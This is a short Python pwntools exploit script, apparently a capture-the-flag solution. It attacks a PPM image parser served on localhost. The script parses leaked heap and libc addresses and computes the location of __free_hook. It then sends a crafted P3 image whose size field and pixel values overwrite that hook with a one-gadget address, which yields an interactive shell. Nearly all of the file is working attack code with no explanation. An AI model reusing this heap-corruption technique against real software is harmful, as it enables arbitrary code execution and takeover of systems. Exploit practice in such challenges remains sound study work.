from pwn import *
context.terminal = ["terminator", "-e"]

libc_base_offset = 0x7f28532e1020-0x007f285324a000


malloc_base = 0x00000000602000

gadget = 0x4f302

p = remote("localhost", 1024)
#p = process("./a.out_patched")
#gdb.attach(p, '''
#b *0x0000000000400f7d
#c''')
print(p.recvuntil("leaky "))
heap_base = int(p.recvuntil(" ")[2:], 16)-0x260
libc_base = int(p.recvuntil("\n")[2:], 16)-libc_base_offset
log.info(f"Got leak libc {hex(libc_base)} and heap {hex(heap_base)}")

free_hook = libc_base+(0x7fc0f2e6b8e8-0x007fc0f2a7e000)
log.info("Free hook addr: " + str(hex(free_hook)))

size = (free_hook-heap_base)-0x2c0

log.info(f"Wanting to alloc {hex(size)}")

gadgetfmt = ""
target = p64(libc_base + gadget)
for i in range(len(target)):
    gadgetfmt += f"{str(i+8)} " * target[i]

fp = f"""P3
2753074036095 6700417
{str(size)}
255 255 255 255 255 255 255 255 255 255 255 255
100 100 100 100 100 100 200 200 200 200 200 200
240  255  255  255  255  255  255  255  20  20  20  20
{gadgetfmt}
\x00
"""

p.send(fp)
p.interactive()
p.shutdown()

print(fp)